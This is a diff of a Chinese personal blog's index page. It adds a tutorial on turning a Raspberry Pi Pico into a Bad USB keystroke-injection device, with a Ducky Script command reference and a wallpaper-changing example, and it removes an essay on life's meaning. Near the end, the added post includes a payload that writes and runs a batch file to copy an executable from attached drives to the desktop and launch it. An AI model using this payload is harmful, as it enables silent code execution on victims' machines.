@@ -33,6 +33,10 @@
         <li class="menu-item text-underline">
             <a href="/Blackcat-loveBlog/about/about">About</a>
         </li>
+    
+        <li class="menu-item text-underline">
+            <a href="/Blackcat-loveBlog/friends/friends">Menu.友链</a>
+        </li>
             
     </ul>
 </div>
@@ -41,6 +45,170 @@
             <main class="main">
                 <section class="posts clearfix">
     <div class="posts-wrapper">
+    
+        <article class="post article-entry">
+            <div class="post-title">
+                <a class="post-title-link text-underline" href="/Blackcat-loveBlog/2024/05/29/%E4%BD%BF%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E4%B8%80%E4%B8%AAbad-usb/">使用树莓派做一个bad usb</a>
+            </div>
+            <p class="sub">May 29 2024</p>
+            <div class="post-content">
+                
+                    <p>参考视频:</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1o6421g7UW/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=adbd70f3395ed4825cbab1afe7aa152e">作者:xsTaoo 标题:物理黑客工具 Bad USB 制作教程</a></p>
+<p><a href="github.com/dbisu/pico-ducky">原文章</a></p>
+<p>首先在网上购买一个RP2024 Pico开发板</p>
+<p>双核Cortex M0 主频有133MHz</p>
+<p>USB Type-C</p>
+<p>如果你买的是 PR2024 Pico W版本 还会多一个WiFi模块</p>
+<p><img src="/Blackcat-loveBlog/png/ShuMei.jpg"></p>
+<p>需要准备一根数据线，插入后连接电脑，如果你的买的是安卓线，则需要四芯的，否则供电不足可能无法打开。</p>
+<p>我买的是Type-C，插入后还是没有反应。</p>
+<p>打开设备管理器，发现没有识别到未知设备，但是多了几个串口。</p>
+<p>通过查看客服发送的连接教程，发现老师也遇到了同样的情况，这种情况通过自己安装驱动，来完成电脑对设备的识别。</p>
+<p>但这是可以识别到未知设备，但没有在我的电脑里显示到设备时候的做法，我只能显示串口，所以我通过长按固件的Bootsel按钮，然后插入电脑，这样就可以显示出来设备了。</p>
+<p>下载好提供的资料</p>
+<p>首先刷入固件，将adafruit-circuitpython-raspberry_pi_pico-en_US-8.0.0.uf2 粘贴到固件内</p>
+<p>然后固件断开，重连</p>
+<p>将Bad USB复制到固件内，出现是否覆盖选择对</p>
+<p>成功后，通过修改pauload.dd来实现插入Usb后自动操作的内容</p>
+<p>关于Ducky Script的脚本和语法可以参考另一篇文章，这里我直接粘贴过来当然也可以访问原文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv5472965/?from=search&spm_id_from=333.337.0.0">Ducky Script的脚本和语法</a></p>
+<p>GUI                       windows菜单键</p>
+<p>WINDOWS           windows菜单键</p>
+<p>SHIFT                    shift键</p>
+<p>ALT                      Alt键</p>
+<p>CONTROL            Ctrl键</p>
+<p>CTRL                    Ctrl键</p>
+<p>DOWNARROW     下箭头</p>
+<p>DOWN                 下箭头</p>
+<p>LEFTARROW         左箭头</p>
+<p>LEFT                     左箭头</p>
+<p>RIGHTARROW      右箭头</p>
+<p>RIGHT                   右箭头</p>
+<p>UPARROW            上箭头</p>
+<p>UP                        上箭头</p>
+<p>BREAK                 Pause键</p>
+<p>PAUSE                 和上一个是一样的</p>
+<p>CAPSLOCK           大写键</p>
+<p>DELETE                删除键</p>
+<p>END                     END键，我估计你们不常用这个</p>
+<p>ESC                      键盘上左上角的键</p>
+<p>ESCAPE                键盘上左上角的键</p>
+<p>HOME                 Home键</p>
+<p>INSERT                 Insert键</p>
+<p>NUMLOCK           键盘锁键</p>
+<p>PAGEUP               上翻页键</p>
+<p>PAGEDOWN         下翻页键</p>
+<p>PRINTSCREEN      屏幕截屏键</p>
+<p>SCROLLLOCK       话说不写文档我都想不起键盘上还有这个键，Scrolllock键</p>
+<p>SPACE                 空格键，如果你延时把握的好，你甚至可以用这个指令玩炫舞</p>
+<p>TAB                      就是Tab键咯</p>
+<p>REPEAT是一个很特殊指令，将下面的语句重复多少遍，举个例子。</p>
+<p>REPEAT 100</p>
+<p>STRING Hello World！</p>
+<p>以上的代码块就是输出Hello World！这条语句一百次，无情的打字机器，对吧。</p>
+<p>说点题外话，我这两天拍的教程中的设备，USB Ninja Pro还在以上基础上添加了一些功能，也就是几个新的脚本指令。我在这里也介绍下。</p>
+<p>USBON             切换到Ninja的USB口，原本通道关闭</p>
+<p>USBOFF            切换至原来的USB口，关闭Ninja的USB通道</p>
+<p>CAPSLOCK ON 大写锁定，使用之后，保证电脑一直在大写锁定态</p>
+<p>CAPSLOCK OFF 大写锁定关，保证电脑在非大写锁定态</p>
+<p>PLUGAUTORUN 后面跟数字，下一次插入直接运行数字对应的SLOT里面存储的脚本</p>
+<p>MSCREAD         手动将ROM里面的数据加载到RAM，也就是挂载U盘操作</p>
+<p>MSCSAVE          手动将RAM里面的数据加载到ROM，也就是断开并保持U盘内容</p>
+<p>MSCWIPE          擦除ROM盘里面的数据</p>
+<p>MSCFORM        格式化ROM盘中的数据</p>
+<p>MSCONOFF      后跟参数0或者1，为1时U盘功能启动</p>
+<p>举个完整的例子吧。</p>
+<p>REM This is a script to download and change the wallpaper in windows 10</p>
+<p>REM In order to work, windows must be using the default app for opening photos</p>
+<p>以上两句是注释行</p>
+<p>DELAY 5000                </p>
+<p>延时5000ms，也就是五秒</p>
+<p>CONTROL ESCAPE</p>
+<p>Ctrl键加Esc键</p>
+<p>DELAY 100</p>
+<p>延时100ms</p>
+<p>REM Note: The internet explorer method works usually for everyone but</p>
+<p>REM If you want to use Chrome or Firefox instead of IE, remove ‘iexplorer’ from the following line</p>
+<p>REM but also make sure to follow instructions bellow</p>
+<p>又是三行注释</p>
+<p>STRING iexplore <a target="_blank" rel="noopener" href="http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg">http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg</a></p>
+<p>使用ie打开一个网址</p>
+<p>ENTER</p>
+<p>回车</p>
+<p>DELAY 4000</p>
+<p>延时4秒</p>
+<p>CONTROL s</p>
+<p>Ctrl键加s键，也就是保存了</p>
+<p>DELAY 2000</p>
+<p>延时</p>
+<p>ENTER</p>
+<p>回车</p>
+<p>DELAY 300</p>
+<p>延时</p>
+<p>CONTROL ESCAPE</p>
+<p>Ctrl加ESC键</p>
+<p>DELAY 300</p>
+<p>延时</p>
+<p>REM If you want to use Chrome, change ‘Documents’ to ‘Downloads’</p>
+<p>REM If you want to use Firefox, change ‘Documents’ to ‘Pictures’</p>
+<p>注释</p>
+<p>STRING %USERPROFILE%\Documents\01-rubberduck-hongkong.jpg</p>
+<p>输入了一条指令</p>
+<p>DELAY 500</p>
+<p>ENTER</p>
+<p>DELAY 500</p>
+<p>TAB</p>
+<p>DELAY 500</p>
+<p>TAB</p>
+<p>DELAY 500</p>
+<p>TAB</p>
+<p>DELAY 500</p>
+<p>TAB</p>
+<p>DELAY 500</p>
+<p>TAB</p>
+<p>DELAY 500</p>
+<p>TAB</p>
+<p>DELAY 500</p>
+<p>TAB</p>
+<p>DELAY 500</p>
+<p>ENTER</p>
+<p>DELAY 500</p>
+<p>DOWN</p>
+<p>DELAY 500</p>
+<p>DOWN</p>
+<p>DELAY 500</p>
+<p>DOWN</p>
+<p>DELAY 500</p>
+<p>DOWN</p>
+<p>DELAY 500</p>
+<p>ENTER</p>
+<p>DELAY 500</p>
+<p>DOWN</p>
+<p>DELAY 500</p>
+<p>DOWN</p>
+<p>DELAY 500</p>
+<p>ENTER</p>
+<p>DELAY 500</p>
+<p>后面就是模拟键盘进行了一系列的选择了，最终，你的壁纸会被替换为上面网址中的图片。</p>
+<p>我这里也放一段脚本，推荐你们自行理解并使用</p>
+<p>MSCREAD</p>
+<p>USBON</p>
+<p>CAPSloCk On</p>
+<p>GUI r</p>
+<p>DELAY 500</p>
+<p>STRING cmd &#x2F;c echo “cmd &#x2F;c ping 127.0.0.1 &gt; nul &amp;&amp; for %%i in (A B C D E F G H I J K) do copy %%i:\fuck.exe %USERPROFILE%\Desktop\fuck.exe &amp;&amp; start %USERPROFILE%\Desktop\fuvk.exe” &gt; %Temp%\a.bat &amp;&amp; %Temp%\a.bat</p>
+<p>ENTER</p>
+<p>CAPSloCk Off</p>
+<p>DELAY 5000</p>
+<p>REPEAT 2</p>
+<p>USBOFF</p>
+<p>玩的开心XD </p>
+<p>作者：无序熵增 <a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv5472965/?from=search&spm_id_from=333.337.0.0">https://www.bilibili.com/read/cv5472965/?from=search&amp;spm_id_from=333.337.0.0</a> 出处：bilibili</p>
+
+                
+            </div>
+        </article>
     
         <article class="post article-entry">
             <div class="post-title">
@@ -1110,41 +1278,6 @@
             </div>
         </article>
     
-        <article class="post article-entry">
-            <div class="post-title">
-                <a class="post-title-link text-underline" href="/Blackcat-loveBlog/2024/03/30/%E7%94%9F%E5%91%BD%E4%B8%8E%E4%BB%B7%E5%80%BC/">生命与价值</a>
-            </div>
-            <p class="sub">Mar 30 2024</p>
-            <div class="post-content">
-                
-                    <p>在人的一生当中，我们总是会追问自己，人生的意义何在，第一次追问，是在被人欺负的时候，那时候还小，意气用事，突然觉得不想活了，这时候觉得人生没意义，所以拿得起放得下，很勇，很大程度上敢于这样做的原因，我认为是阅历太浅，本身还没有赋予什么价值，所以更加容易放弃。</p>
-<p>再然后，慢慢的，长大了，经历了很多事情，有家人，朋友，同学，毕业后，第二次思考起人生的意义，因为感到迷茫，找不到生活的方向，这时候家人，朋友，同学，会给你指明道路，但他们能为你带来的，也只是他们认为最好的罢了。</p>
-<p>最后，你也成人，经历了社会的风风雨雨，步入末年，再次思考起人生的意义，回想起曾经的点点滴滴，或心酸，或高兴，但穷尽一生，依旧没能明白人生的意义是什么，还是会茫然。</p>
-<p>摇摇晃晃数十载年，却获得不明不白，到底哪里出错了？意义又何在？</p>
-<p>有时候会抱怨起富人，憎恨阶级，后悔没有能力，如果出生在好人家该多好？</p>
-<p>那些修仙的人嘴里总是重复出现一个词语“道”，老君也常说：“大道无形，生育天地；大道无情，运行日月；大道无名，长养万物”，再者，人们也常说： “条条大路通罗马”、“行行出状元”这种话，这些看似没有关系的语句，所说的道理和蕴含其中意义，都是无形的，虚的。</p>
-<p>而人的实的，当实人去感受虚物，那么当然是让人感到迷茫了。</p>
-<p>虽然说是“虚的”，但不代表不存在，只是他们所存在的世界，我们是进不去的，相对来说，在虚的眼中，看我们也是一样的，相对于虚的实，和相对于实的虚。</p>
-<p>正反面，是我们人类自古以来最先感受到的东西，我们会理所应当的喜欢对称的图形，也是这个原因。</p>
-<p>回到开头，那么这一切又和人生的意义有什么关联呢？，这就要说一说价值了，价值是我们衡量一切的单位，价值也是虚的，因为它看不见摸不着，但我们却无时无刻的使用着。</p>
-<p>比如去帮某人做事，会得到相应的奖励也会承担风险，这时候就要衡量价值，如果奖励大于风险，那么则乐意于帮助，反之则拒绝。</p>
-<p>长时间以来，不断的交易不断的帮助，形成一套人生的价值观，这个价值观也是虚的，但是我们却对它唯命是从，从不怀疑，从不反抗。</p>
-<p>在二十世纪的人们看来，假如我支付十万块需要你为我工作一个月，那么你会很乐意的帮助我，因为这个时代人们的价值观，这样的工作是极好的，因为当时的工资普遍都是3000元——6000元之间，那么我换个说法，我用十万块买你一个月的生命，这样看来，仿佛有所抵触，感觉生命的重量好像比起十万块更大一些，明明所作的都是同一件事情，但是为什么前者人们更能接收，这就是价值观在作祟，也是富人和穷人最大的不同，以及其背后虚幻的真正的敌人。</p>
-<p>在我这些年的人生当中，有一句话是我自己总结的，我不知道有没有那个人和我说过同样的话。</p>
-<p>“人生最大的敌人就是自己，最需要警惕的则是身边的朋友”</p>
-<p>之前看过姜文的一段访谈，他说过，人生就像是织毛衣，你本来是一条直线，然后你和其他人接触，最后弯曲，然后变成一件衣服穿在身上，没了它你还会感到冷，但不要忘记，你是直的，其实你可以自己选择的，你可以选择不和他们在一起，去和其他人，织成一块布，或者干脆不织了。</p>
-<p>越是厉害的人，越是保持自己的直线，不与他人交织相融，还有些人自立山头，也没什么不好的。</p>
-<p>人离不开环境，环境容易改变人</p>
-<p>朋友会帮助人，但其实会害了你</p>
-<p>家人要你听从，其实让你也同化</p>
-<p>你变得迷茫，你也不是你自己</p>
-<p>最后，我想借用功夫熊猫里面的一个片段，阿宝想要成为神龙大侠，师傅将最强的秘籍交给他，但是里面什么都没有，大家很恐慌，觉得世界上根本没有最强的秘籍，但阿宝却明白，当秘籍照应出他的脸时候，他成为了他自己，他于自己达成和解</p>
-<p>“我是谁？一只鹅的儿子？还是一只熊猫的孩子？一个师傅？还是一个徒弟？答案是我都是，我就是神龙大侠”</p>
-
-                
-            </div>
-        </article>
-    
 </div>
 <div class="side-bar">
 
@@ -1163,7 +1296,7 @@
         </div>
     <div class="tags">
     <h3 class="tags-title">Tags</h3>
-    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" rel="tag">年终总结</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/Dos/" rel="tag">Dos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/GdScript/" rel="tag">GdScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/Git/" rel="tag">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/Go/" rel="tag">Go</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/JQuery/" rel="tag">JQuery</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/JS/" rel="tag">JS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/%E6%A1%86%E6%9E%B6/" rel="tag">框架</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">1</span></li></ul>
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" rel="tag">年终总结</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/Dos/" rel="tag">Dos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/GdScript/" rel="tag">GdScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/Git/" rel="tag">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/Go/" rel="tag">Go</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/JS/" rel="tag">JS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/JQuery/" rel="tag">JQuery</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/Blackcat-loveBlog/tags/Redis/" rel="tag">Redis</a><span class="tag-list-count">1</span></li></ul>
 </div>
     </div>
 </div>
